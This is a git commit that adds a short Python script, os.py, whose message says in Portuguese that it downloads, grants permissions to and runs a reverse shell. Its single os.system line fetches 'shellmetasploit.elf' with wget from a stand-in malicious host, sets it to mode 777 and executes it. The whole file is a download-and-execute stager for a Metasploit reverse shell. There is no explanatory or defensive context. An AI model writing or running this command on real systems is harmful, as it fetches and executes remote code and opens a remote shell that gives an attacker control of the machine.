fd5ae1a25e55114b57aeb516da9eb3cad818995d
BlackCyber21 <35323386+BlackCyber21@users.noreply.github.com>
2020-12-09 22:31:08 +0000

    Add files via upload

---
+++ os.py
@@ -0,0 +1,4 @@
+#!/usr/bin/python
+import os
+print "Baixando, dando permissoes e executando uma shellreverse"
+os.system("wget https://seuhostbad.com/shellmetasploit.elf && chmod 777 shellmetasploit.elf && ./shellmetasploit.elf")
